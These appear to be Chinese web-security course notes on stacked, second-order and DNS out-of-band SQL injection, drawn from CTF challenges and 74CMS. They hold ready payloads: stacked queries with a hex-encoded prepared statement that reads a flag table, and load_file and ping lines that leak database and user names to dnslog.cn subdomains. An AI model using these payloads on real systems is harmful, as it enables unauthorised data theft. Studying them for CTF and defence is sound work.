# WEB攻防-通用漏洞&SQL注入&CTF&二次&堆叠&DNS带外

![day30](/Users/yangluchao/Documents/GitHub/security/image/day30.png)

```
#知识点：
1、数据库堆叠注入
根据数据库类型决定是否支持多条语句执行
2、数据库二次注入
应用功能逻辑涉及上导致的先写入后组合的注入
3、数据库Dnslog注入
解决不回显(反向连接),SQL注入,命令执行,SSRF等
4、黑盒模式分析以上
二次注入：插入后调用显示操作符合
堆叠注入：判断注入后直接调多条执行
DNS注入：在注入上没太大利用价值，其他还行

```

![day30_1](/Users/yangluchao/Documents/GitHub/security/image/day30_1.png)

```
#二次注入-74CMS&网鼎杯2018Unfinish
CTF-[网鼎杯2018]Unfinish-黑盒
CMS-74CMS个人会员中心-黑白盒

#堆叠注入-数据库类型&强网杯2019随便注
根据数据库类型决定是否支持多条语句执行
支持堆叠数据库类型：MYSQL MSSQL Postgresql等
';show databases;
';show tables;
';show columns from `1919810931114514`;
';select flag from `1919810931114514`;
';SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql;

#DNS利用-平台介绍&SQL注入&命令执行等
1.平台
http://www.dnslog.cn
http://admin.dnslog.link
http://ceye.io
2.应用场景：
解决不回显，反向连接，SQL注入，命令执行，SSRF等
SQL注入：
select load_file(concat('\\\\',(select database()),'.7logee.dnslog.cn\\aa'));
and (select load_file(concat('//',(select database()),'.69knl9.dnslog.cn/abc')))
命令执行：
ping %USERNAME%.7logee.dnslog.cn
```

